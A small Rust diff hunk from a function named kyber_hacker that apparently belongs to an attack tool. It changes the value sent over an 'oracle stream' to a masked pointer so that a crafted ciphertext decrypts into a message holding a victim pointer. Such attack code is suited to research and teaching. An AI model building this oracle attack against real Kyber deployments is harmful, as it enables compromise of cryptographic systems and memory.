@@ -470,8 +470,7 @@ fn kyber_hacker(
     // Send random mask and masked pointer so that constructed ciphertext is decrypted into
     // message containing victim pointer
     oracle_stream.write_all(&rand_mask.to_le_bytes()).unwrap();
-    // TODO: send first pointer from ptr since it is masked target_addr
-    oracle_stream.write_all(&target_addr.to_le_bytes()).unwrap();
+    oracle_stream.write_all(&ptr[0].to_le_bytes()).unwrap();
 
     group_search_flag = 1;
 
